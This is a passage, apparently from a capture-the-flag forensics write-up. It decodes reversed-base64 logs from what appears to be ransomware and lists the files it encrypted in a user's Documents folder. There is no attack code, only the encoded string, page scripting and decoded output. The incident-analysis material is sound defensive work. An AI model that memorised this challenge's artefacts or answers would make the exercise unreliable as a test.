hsFIkVGdwlncj5WZgc3buBycpB-d4RnLz81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukjMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4IzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yNy81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYjMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1IzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-Ny81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMjMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLyIzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SMy81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduAjMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLy81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukTMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4_zXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yNx81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYTMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1_zXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-Nx81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMTMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLy_zXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SMx81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduATMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLx81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGIn5Gcus2YhxmYcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGInBnaugzYyMTMmdzYkJWNykjMzAjMxkTY0QDMhRWY5MjNxQWYcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGInBnau42X1MjM5QzNyITO3IjN4kjN0IjM28FOzMTN4MjM4IjMwcDMzIzXzMjM4YzM4QjMcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGIn5GcuQWZ1YDN4UzYjZTMxgTNkNGZhFTNzMjY4cDZ1UWYiNTMcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyW\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cp>The logs were encrypted with R64Encoder so we’ll reuse the script we used before.\u003C/p>\n\u003Cp>![alt text](&#x3C;../../../assets/images/urgent-tina/2025-04-08_01-16.png)\u003C/p>\n\u003Cp>It’s a bit hard to read, so we can modify the script a bit.\u003C/p>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> python .\\B64ReverseLogs.py\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">[\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\13bae5d78b3351adcd58116cc58465ed.png is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\248368233_230702282385338_6224698627922749235_n.jpg is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\ad1639ada044a912032925bdc7f132c8.jpg is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\black.png is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_1.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_10.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_11.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_12.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_13.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_14.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_15.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_16.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_17.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_18.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_19.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_2.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_20.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_21.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_22.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_23.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_24.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_25.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_26.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_27.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_28.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_29.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_3.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_30.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_31.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_32.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_33.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_34.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_35.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_36.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_37.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_38.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_39.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_4.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_40.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_41.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_42.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_43.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_44.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_45.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_46.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_47.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_48.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_49.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_5.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_50.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_51.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_52.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_53.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_54.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_55.txt is now encrypted 